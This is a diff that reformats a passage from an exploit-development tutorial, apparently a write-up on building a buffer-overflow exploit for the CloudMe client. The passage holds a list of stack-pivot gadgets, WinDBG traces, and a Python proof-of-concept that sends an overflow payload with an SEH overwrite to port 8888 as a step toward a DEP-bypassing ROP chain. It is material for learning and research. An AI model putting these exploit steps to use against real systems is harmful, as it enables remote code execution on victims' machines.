@@ -873,7 +873,9 @@ Stack pivots, minimum distance 1368
 -------------------------------------
 Non-SafeSEH protected pivots :
 ------------------------------
-[..snip..] 0x6998fb2e : {pivot 1916 / 0x77c} : **# ADD ESP,76C # POP EBX # POP ESI # POP EDI # POP EBP # RETN** ** [Qt5Network.dll] ** | {PAGE_EXECUTE_WRITECOPY}  
+[..snip..] 
+0x6998fb2e : {pivot 1916 / 0x77c} : **# ADD ESP,76C # POP EBX # POP ESI # POP EDI # 
+POP EBP # RETN ** [Qt5Network.dll] ** | {PAGE_EXECUTE_WRITECOPY}  
 [..snip..]
 ```
 
@@ -975,26 +977,97 @@ except Exception as e:
 Now lets put a breakpoint at the address **0x6998fb2e**
 
 ```
-0:000\> bp 0x6998fb2e *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll - 0:000\> bl 0 e 6998fb2e 0001 (0001) 0:** ** Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e
+0:000\> bp 0x6998fb2e 
+*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll - 
+0:000\> bl 
+0 e 6998fb2e 0001 (0001) 0:**** Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e
 ```
 
 Lets observe the crash below. As we see, we are stepping into every instruction after we hit the first breakpoint. Then, when we reach the last gadget, we check the **ESP** register once again in order to see if we have made the right calculations.
 
 ```
-0:000\> g Breakpoint 0 hit eax=00000000 ebx=00000000 ecx=6998fb2e edx=777071cd esi=00000000 edi=00000000 eip=6998fb2e esp=0022cf18 ebp=0022cf38 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e: 6998fb2e 81c46c070000 add esp,76Ch 0:000\> t eax=00000000 ebx=00000000 ecx=6998fb2e edx=777071cd esi=00000000 edi=00000000 eip=6998fb34 esp=0022d684 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x884: 6998fb34 5b pop ebx 0:000\> eax=00000000 ebx=62433961 ecx=6998fb2e edx=777071cd esi=00000000 edi=00000000 eip=6998fb35 esp=0022d688 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x885: 6998fb35 5e pop esi 0:000\> eax=00000000 ebx=62433961 ecx=6998fb2e edx=777071cd esi=31624330 edi=00000000 eip=6998fb36 esp=0022d68c ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x886: 6998fb36 5f pop edi 0:000\> eax=00000000 ebx=62433961 ecx=6998fb2e edx=777071cd esi=31624330 edi=43326243 eip=6998fb37 esp=0022d690 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x887: 6998fb37 5d pop ebp 0:000\> eax=00000000 ebx=62433961 ecx=6998fb2e edx=777071cd esi=31624330 edi=43326243 eip=6998fb38 esp=0022d694 ebp=62433362 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x888: 6998fb38 c3 ret 0:000\> dd esp 0022d694 35624334 43366243 62433762 39624338 0022d6a4 43306343 63433163 33634332 43346343 0022d6b4 63433563 37634336 43386343 64433963 0022d6c4 31644330 43326443 64433364 35644334 0022d6d4 43366443 64433764 39644338 43306543 0022d6e4 65433165 33654332 43346543 65433565 0022d6f4 37654336 43386543 66433965 31664330 0022d704 43326643 66433366 35664334 43366643
+0:000> g
+Breakpoint 0 hit
+eax=00000000 ebx=00000000 ecx=6998fb2e edx=777071cd esi=00000000 edi=00000000
+eip=6998fb2e esp=0022cf18 ebp=0022cf38 iopl=0 nv up ei pl zr na pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e:
+6998fb2e 81c46c070000 add esp,76Ch
+0:000> t
+eax=00000000 ebx=00000000 ecx=6998fb2e edx=777071cd esi=00000000 edi=00000000
+eip=6998fb34 esp=0022d684 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x884:
+6998fb34 5b pop ebx
+0:000> 
+eax=00000000 ebx=62433961 ecx=6998fb2e edx=777071cd esi=00000000 edi=00000000
+eip=6998fb35 esp=0022d688 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x885:
+6998fb35 5e pop esi
+0:000> 
+eax=00000000 ebx=62433961 ecx=6998fb2e edx=777071cd esi=31624330 edi=00000000
+eip=6998fb36 esp=0022d68c ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x886:
+6998fb36 5f pop edi
+0:000> 
+eax=00000000 ebx=62433961 ecx=6998fb2e edx=777071cd esi=31624330 edi=43326243
+eip=6998fb37 esp=0022d690 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x887:
+6998fb37 5d pop ebp
+0:000> 
+eax=00000000 ebx=62433961 ecx=6998fb2e edx=777071cd esi=31624330 edi=43326243
+eip=6998fb38 esp=0022d694 ebp=62433362 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x888:
+6998fb38 c3 ret
+0:000> dd esp
+0022d694 35624334 43366243 62433762 39624338
+0022d6a4 43306343 63433163 33634332 43346343
+0022d6b4 63433563 37634336 43386343 64433963
+0022d6c4 31644330 43326443 64433364 35644334
+0022d6d4 43366443 64433764 39644338 43306543
+0022d6e4 65433165 33654332 43346543 65433565
+0022d6f4 37654336 43386543 66433965 31664330
+0022d704 43326643 66433366 35664334 43366643
 ```
 
 As we see, the **ESP** register points to **0x0022d694** which contains the pattern **35624334** (offset 0x224 from the beginning of the payload) ,which is expected considering we are jumping extra 548 bytes from the beginning of the payload ( 1916 - 1368 ).
 
 ```
-0:000\> ? 0022d694 - 0022d470 Evaluate expression: 548 = 00000224 0:000\> ? 0022d484 - esp Evaluate expression: 0 = 00000000
+0:000> ? 0022d694 - 0022d470
+Evaluate expression: 548 = 00000224
+0:000> ? 0022d484 - esp
+Evaluate expression: 0 = 00000000
 ```
 
 At this point we are confident that we are moving in the right way. Furthermore, we should create another proof of concept script in order to see that we have full control when performing our stack pivot. All we want now is to find our landing location where we will put our **ROP** chain to bypass **DEP** protection.
 
-```
-import struct import socket
-import sys target = "127.0.0.1" junk1 = "A"\*1604 rop = "BBBB" # placeholder. Here will be the start of our ROP chain junk2 = "C"\*(2236 - len(rop) - len(junk1)) seh = struct.pack('L',0x6998fb2e) # ADD ESP,76C # POP EBX # POP ESI # POP EDI # POP EBP # RETN payload = junk1 + rop + junk2 + seh try: s=socket.socket(socket.AF\_INET, socket.SOCK\_STREAM) s.connect((target,8888)) s.send(payload) except Exception as e: print(sys.exc\_value)
+```python
+import struct
+import socket
+import sys
+
+target = "127.0.0.1"
+
+junk1 = "A"*1604 
+
+rop = "BBBB"  # placeholder. Here will be the start of our ROP chain
+
+junk2 = "C"*(2236 - len(rop) - len(junk1))
+
+seh = struct.pack('L',0x6998fb2e) # ADD ESP,76C # POP EBX # POP ESI # POP EDI # POP EBP # RETN  
+
+payload = junk1 + rop + junk2 + seh 
+
+try:
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((target,8888))
+    s.send(payload)
+except Exception as e:
+    print(sys.exc_value)
 ```
 
 Below is the debugging **WinDBG** session corresponding to the PoC exploit above, that proves the successful pivoting
